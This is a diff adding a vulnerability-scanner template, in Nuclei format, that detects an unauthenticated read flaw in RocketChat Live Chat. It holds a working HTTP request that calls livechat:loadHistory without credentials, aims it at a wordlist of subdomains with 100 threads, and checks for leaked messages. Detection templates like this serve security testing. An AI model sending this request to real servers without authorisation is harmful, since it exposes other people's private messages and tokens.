@@ -1,0 +1,40 @@
+id: rockethchat-unauth-access 2
+
+info:
+  name: RocketChat Unauthenticated Read Access
+  author: rojanrijal
+  severity: critical
+  description: An issue with the Live Chat accepting invalid parameters could potentially allow unauthenticated access to messages and user tokens.
+  reference: https://docs.rocket.chat/guides/security/security-updates
+  tags: rockethchat,unauth
+
+requests:
+  - payloads:
+      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+    attack: sniper
+    threads: 100
+
+    raw:
+      - |
+        POST /api/v1/method.callAnon/cve_exploit HTTP/1.1
+        Host: {{Subdomains}}
+        Origin: https://{{Subdomains}}
+        Connection: close
+        X-Requested-With: XMLHttpRequest
+        Content-Type: application/json
+        User-Agent: Ophion SecurityGroup
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.9
+
+        {"message":"{\"msg\":\"method\",\"method\":\"livechat:loadHistory\",\"params\":[{\"token\":\"cvenucleirocketchat\",\"rid\":\"GENERAL\"}],\"msg\":\"123\"}"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '"{\"msg\":\"result\",\"result\":{\"messages\"'
+          - '"success":true'
+        part: body
+        condition: and
